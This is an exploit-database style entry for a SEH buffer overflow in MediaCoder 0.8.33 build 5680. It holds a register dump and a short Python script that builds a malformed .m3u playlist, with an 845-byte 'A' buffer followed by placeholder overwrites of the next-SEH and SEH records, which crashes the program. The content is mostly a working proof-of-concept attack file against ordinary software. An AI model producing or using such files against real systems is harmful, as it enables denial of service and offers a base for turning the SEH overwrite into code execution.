# Exploit Title: Mediacoder 0.8.33 build 5680 SEH Buffer Overflow Exploit Dos (.m3u)
# Date: 11/29/2010
# Author: Hadji Samir s-dz@hotmail.fr
# Software Link: http://dl.mediacoderhq.com/files001/MediaCoder-0.8.33.5680.exe
# Version: 0.8.33 build 5680

   EAX 0012E508
   ECX 43434343
   EDX 00000000
   EBX 43434343
   ESP 0012E4A4
   EBP 0012E4F4
   ESI 0012E508
   EDI 00000000

#!/usr/bin/python
buffer = ("http://" + "A" * 845)
nseh = ("B" * 4)
seh  = ("C" * 4)
junk = ("D" * 60)

f= open("exploit.m3u",'w')
f.write(buffer + nseh + seh + junk)
f.close()